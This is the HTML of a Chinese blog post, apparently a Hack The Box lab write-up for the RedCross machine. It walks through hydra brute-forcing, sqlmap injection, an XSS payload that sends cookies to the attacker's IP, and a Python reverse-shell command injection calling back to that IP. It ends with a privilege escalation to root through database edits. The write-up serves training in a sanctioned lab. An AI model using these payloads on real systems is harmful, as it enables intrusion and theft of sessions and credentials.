@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>HTB靶机渗透实战Writeup_RedCross | 放荡不羁混世间 | B1ngDa0在这儿舞剑</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶机writeup,hackthebox">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","app_key":"pIKFHOkquTOmXNwhTKx9vBnu","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","appkey":"pIKFHOkquTOmXNwhTKx9vBnu","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">B1ngDa0</h5>
+          <a href="mailto:B1ngDa0@08sec.org" title="B1ngDa0@08sec.org" class="mail">
+            
+              <span>B</span>
+            
+              <span>1</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>D</span>
+            
+              <span>a</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>s</span>
+            
+              <span>e</span>
+            
+              <span>c</span>
+            
+              <span>.</span>
+            
+              <span>o</span>
+            
+              <span>r</span>
+            
+              <span>g</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/b1ngda0" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>HTB靶机渗透实战Writeup_RedCross</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">HTB靶机渗透实战Writeup_RedCross</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-08T08:59:17.000Z" itemprop="datePublished" class="page-time">
+  2019-07-08
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-HTB靶机渗透实战Writeup-RedCross"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">HTB靶机渗透实战Writeup_RedCross</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-08 16:59:17" datetime="2019-07-08T08:59:17.000Z"  itemprop="datePublished">2019-07-08</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+
+
+            
+	<span id="/2019/07/08/HTB靶机渗透实战Writeup-RedCross/" class="leancloud_visitors" data-flag-title="HTB靶机渗透实战Writeup_RedCross" title="HTB靶机渗透实战Writeup_RedCross">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/07/08/HTB靶机渗透实战Writeup-RedCross/#comment">
+            <span class="valine-comment-count" data-xid="/2019/07/08/HTB靶机渗透实战Writeup-RedCross/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class></a>
+                <p></p>
+            </figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的靶机：RedCross的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章。</p>
+<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>hydra爆破web登录<br>sql注入<br>xss获取cookie<br>psql基本操作</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/162" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/162</a><br>目标IP: 10.10.10.113(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描<br><code>nmap -sC -sV -oA  nmap 10.10.10.113</code></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t01d95d0c0b6f6c7214.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t01d95d0c0b6f6c7214.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>目标主机开放了22、80、443端口，在80、443端口都开放了httpd服务。<br>尝试访问10.10.10.113<br>发现进行了重定向</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p2.ssl.qhimg.com/t01c08bd1fad617085a.png" title="" data-fancybox="images"><img src="https://p2.ssl.qhimg.com/t01c08bd1fad617085a.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>使用curl查看 转向至intra.redcross.htb</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01fb72e6a1acd16364.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01fb72e6a1acd16364.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>添加10.10.10.113 intra.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 intra.redcross.htb&quot; &gt; /etc/hosts</code><br>成功访问，页面存在登录框，contact页面</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01d4bfbcd3523ad775.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01d4bfbcd3523ad775.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t016ed4fec831a8bf34.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t016ed4fec831a8bf34.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>登陆框可爆破：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p2.ssl.qhimg.com/t01f08b466e8204cf65.png" title="" data-fancybox="images"><img src="https://p2.ssl.qhimg.com/t01f08b466e8204cf65.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p1.ssl.qhimg.com/t0197198166ad6595e0.png" title="" data-fancybox="images"><img src="https://p1.ssl.qhimg.com/t0197198166ad6595e0.png" alt title class></a>
+                <p></p>
+            </figure>
+<h2 id="账户爆破"><a href="#账户爆破" class="headerlink" title="账户爆破"></a>账户爆破</h2><p>使用hydra进行web登录爆破<code>hydra -L /root/ruokoul/darkweb2017-top1000.txt -P /root/ruokoul/darkweb2017-top1000.txt -s 443 10.10.10.113 https-post-form &quot;/pages/actions.php:user=^USER^&amp;pass=^PASS^&amp;action=login:Wrong&quot;</code><br>(抓包可发现，intra使用的是443端口)<br>爆破得出 guest guest 可进行登录</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p1.ssl.qhimg.com/t0195f7fc096d5ecebf.png" title="" data-fancybox="images"><img src="https://p1.ssl.qhimg.com/t0195f7fc096d5ecebf.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>可使用功能为<a href="https://intra.redcross.htb/?o=1&amp;page=app" target="_blank" rel="noopener">https://intra.redcross.htb/?o=1&amp;page=app</a> 进行uid查询</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01841a7ac5d0e48e68.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01841a7ac5d0e48e68.png" alt title class></a>
+                <p></p>
+            </figure>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>o参数存在注入</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t01871a604733347089.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t01871a604733347089.png" alt title class></a>
+                <p></p>
+            </figure>
+<p><code>sqlmap -p o -r redcross.req --delay=0.5 –dbs</code></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01473e493b8695d089.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01473e493b8695d089.png" alt title class></a>
+                <p></p>
+            </figure>
+<p><code>sqlmap -p o -r redcross.req --delay=0.5 –D redcross --tables</code><br>[13:43:41] [INFO] fetching tables for database: ‘redcross’<br>[13:43:42] [INFO] used SQL query returns 3 entries<br>[13:43:44] [INFO] retrieved: ‘messages’<br>[13:43:45] [INFO] retrieved: ‘requests’<br>[13:43:46] [INFO] retrieved: ‘users’<br>对数据库redcross的表进行dump获得部分hash以及提示：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p1.ssl.qhimg.com/t0107bfe5b675fc743b.png" title="" data-fancybox="images"><img src="https://p1.ssl.qhimg.com/t0107bfe5b675fc743b.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>hash无利用价值 主要看提示</p>
+<h2 id="分站获取"><a href="#分站获取" class="headerlink" title="分站获取"></a>分站获取</h2><p>多次提到admin webapp 管理平台 根据内容来看应该是子域名，直接尝试admin.redcross.htb<br>添加10.10.10.113 admin.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 admin.redcross.htb&quot; &gt; /etc/hosts</code><br>访问admin.redcross.htb</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p2.ssl.qhimg.com/t01e7ce50d628bcd0c6.png" title="" data-fancybox="images"><img src="https://p2.ssl.qhimg.com/t01e7ce50d628bcd0c6.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>此处使用guest尝试登录 显示权限不足，在intra站内有contact页面可通过XSS获取管理员COOKIEs(靶机网站如果有留言板，一般有xss)，通过尝试xss在email处可使用，获取cookie：<br><code>&lt;script&gt;new Image().src=&#39;http://10.10.14.43/&#39;+document.cookie&lt;/script&gt;</code><br>本地监听<br><code>nc –lvp 80</code><br>留言处插入xss<br>得到cookie</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01d08231e66fe5ae3d.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01d08231e66fe5ae3d.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>PHPSESSID=hi743ili2drfd271v2h0gnj8d7<br>通过修改cookie登录admin.redcross.htb</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>网站内有两个功能：添加一个可登录的用户，IP防火墙</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p3.ssl.qhimg.com/t019fa8aab97bbc1c9c.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t019fa8aab97bbc1c9c.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>添加hack用户 密码9m2TxTgI</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t011b10e8240a730f44.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t011b10e8240a730f44.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>添加可通过ip本机ip以及随意的一个ip</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t01ffab3cf9c56db9b8.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t01ffab3cf9c56db9b8.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>经过测试在deny功能处的ip参数存在命令注入：<br>通过burp更改数据，进行命令注入，反弹shell：<code>ip=11.11.11.11;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.43&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&amp;id=13&amp;action=deny</code></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p5.ssl.qhimg.com/t0182f02199070cc51d.png" title="" data-fancybox="images"><img src="https://p5.ssl.qhimg.com/t0182f02199070cc51d.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>获取www-data用户权限<br>权限很低，通过对网站内容进行查看</p>
+<h2 id="通过psql获取root权限"><a href="#通过psql获取root权限" class="headerlink" title="通过psql获取root权限"></a>通过psql获取root权限</h2><p>得到psql连接信息<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user= unixnss password= fios@ew023xnw “);<br>经过连接测试<br>用户unixusrmgr拥有较高的权限。<br>登录psql：<br><code>psql -h 127.0.0.1 -U unixusrmgr -d unix -W</code></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p3.ssl.qhimg.com/t0178e71f09253ed1fb.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t0178e71f09253ed1fb.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>登录后发现只有passwd_table有访问权限<br>并且passwd_table存在我们之前添加的hack用户的uid、gid、homedir;<br>尝试修改gid=0、homdir=’/root’<br>修改成功<br>使用用户hack进行ssh登录</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p3.ssl.qhimg.com/t01d6301c7d10d02f62.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t01d6301c7d10d02f62.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>可以看到虽然已经是root的组的了却不能进行敏感文件访问<br>尝试sudo，系统提示当前用户不是sudo组的<br><code>cat /etc/group</code></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p3.ssl.qhimg.com/t01371ef23668f9f2ee.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t01371ef23668f9f2ee.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>得知sudu组为27<br>杀死用户(修改gid或者其他信息的时候,用户不能被使用)<br>kill -9 <code>lsof -u hack</code><br>修改gid=27<br>并重新登录</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p1.ssl.qhimg.com/t01bef95af8a8a6ecf2.png" title="" data-fancybox="images"><img src="https://p1.ssl.qhimg.com/t01bef95af8a8a6ecf2.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>已经可以使用sudo root权限<br>获取root 完成渗透攻击。</p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>复盘写writeup时发现一些其他方式：</p>
+<h2 id="获得账号密码"><a href="#获得账号密码" class="headerlink" title="获得账号密码"></a>获得账号密码</h2><p>通过枚举网站目录、文件可获得account_signup.pdf </p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t017b5a3329e7004fa8.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t017b5a3329e7004fa8.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p4.ssl.qhimg.com/t01cf5f0d21fe84d655.png" title="" data-fancybox="images"><img src="https://p4.ssl.qhimg.com/t01cf5f0d21fe84d655.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>得知通过向contact页面输入标题credentials 内容username=admin，便可得到账号密码</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p2.ssl.qhimg.com/t01f24b995e254ef185.png" title="" data-fancybox="images"><img src="https://p2.ssl.qhimg.com/t01f24b995e254ef185.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>相较于爆破账号密码会节省很多时间。</p>
+<h2 id="获取admin站点的cookie"><a href="#获取admin站点的cookie" class="headerlink" title="获取admin站点的cookie"></a>获取admin站点的cookie</h2><p>在上文我们使用的xss获取cookie，经过测试intra站点中的guest的cookie带入至admin站点依旧有效。</p>
+<h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p>在我们向防火墙添加本机ip至防火墙之后，再次进行nmap扫描：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_RedCross href="https://p0.ssl.qhimg.com/t01f78d37d072ac8c22.png" title="" data-fancybox="images"><img src="https://p0.ssl.qhimg.com/t01f78d37d072ac8c22.png" alt title class></a>
+                <p></p>
+            </figure>
+<p> 可以看到服务器开启了21、22、80、443、1025(HARAKA)、5432(psql)<br>通过1025端口的服务在msf进行<br>exploit/linux/smtp/haraka<br>的使用将得到用户penpelope的shell<br>相较于上文少一个命令注入的过程<br>并且权限也比www-data大一些</p>
+<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>RedCross是一台更接近于现实的一台机器，它可以有很多路到达root。值得大家去实战练习。</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-08-02T03:51:17.680Z" itemprop="dateUpdated">2019-08-02 11:51:17</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/07/08/HTB靶机渗透实战Writeup-RedCross/" target="_blank" rel="external">https://www.b1ngda0.cn/2019/07/08/HTB靶机渗透实战Writeup-RedCross/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.b1ngda0.cn">
+            <img src="/img/avatar.jpg" alt="B1ngDa0">
+            B1ngDa0
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackthebox/">hackthebox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机writeup/">靶机writeup</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/08/HTB靶机渗透实战Writeup-RedCross/&title=《HTB靶机渗透实战Writeup_RedCross》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/08/HTB靶机渗透实战Writeup-RedCross/&title=《HTB靶机渗透实战Writeup_RedCross》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/07/09/第一篇博客/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">第一篇博客</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/07/07/HTB靶机渗透实战Writeup-Vault/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">HTB靶机渗透实战Writeup_Vault</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#本文涉及知识点"><span class="post-toc-number">2.</span> <span class="post-toc-text">本文涉及知识点:</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战"><span class="post-toc-number">3.</span> <span class="post-toc-text">实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">信息收集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#账户爆破"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">账户爆破</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">sql注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分站获取"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">分站获取</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#命令注入"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">命令注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通过psql获取root权限"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">通过psql获取root权限</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#后续"><span class="post-toc-number">4.</span> <span class="post-toc-text">后续</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获得账号密码"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">获得账号密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获取admin站点的cookie"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">获取admin站点的cookie</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获得shell"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">获得shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#个人感悟"><span class="post-toc-number">5.</span> <span class="post-toc-text">个人感悟</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.b1ngda0.cn" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                B1ngDa0 &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/08/HTB靶机渗透实战Writeup-RedCross/&title=《HTB靶机渗透实战Writeup_RedCross》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/08/HTB靶机渗透实战Writeup-RedCross/&title=《HTB靶机渗透实战Writeup_RedCross》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
